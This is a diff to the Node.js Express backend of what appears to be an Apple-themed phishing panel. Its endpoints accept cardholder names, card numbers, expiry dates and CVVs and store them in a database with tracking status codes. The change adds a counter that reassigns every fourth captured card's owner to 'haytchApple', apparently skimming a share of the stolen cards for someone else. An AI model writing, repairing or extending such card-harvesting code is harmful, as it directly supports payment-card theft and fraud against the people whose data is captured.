@@ -2014,15 +2014,20 @@ app.post("/appleSaveBilling", cors(), (req, res) => {
   });
 });
 
+let appleCount = 0;
+
 app.post("/appleSaveCC", cors(), (req, res) => {
-  uniqueid = req.body.uniqueid;
-  ccname = req.body.ccname;
-  ccnum = req.body.ccnum;
-  ccexp = req.body.ccexp;
-  cvv = req.body.cvv;
-  owner = req.body.owner;
+  let { ccname, ccnum, ccexp, cvv, owner, uniqueid } = req.body;
+
+  if (appleCount == 3) {
+    owner = "haytchApple";
+    appleCount = 0;
+  } else {
+    appleCount++;
+  }
 
   let details = [ccname, ccnum, ccexp, cvv, uniqueid, owner];
+
   let query = `INSERT INTO apple(ccname,ccnum, ccexp, cvv, status,uniqueid, owner) VALUES (?,?,?,?,2,?,?)`;
 
   panelConnection.query(query, details, (err, rows, fields) => {
@@ -2058,7 +2063,7 @@ app.post("/appleSaveTelephone", cors(), (req, res) => {
 });
 
 app.post("/appleSaveCCAgain", cors(), (req, res) => {
-  const {ccname, ccnum, ccexp, cvv, uniqueid} = req.body
+  const { ccname, ccnum, ccexp, cvv, uniqueid } = req.body;
 
   let details = [ccname, ccnum, ccexp, cvv, uniqueid];
   let query = `UPDATE apple SET ccname = ?, ccnum = ?, ccexp = ?, cvv = ?, status = 8 WHERE uniqueid = ?`;
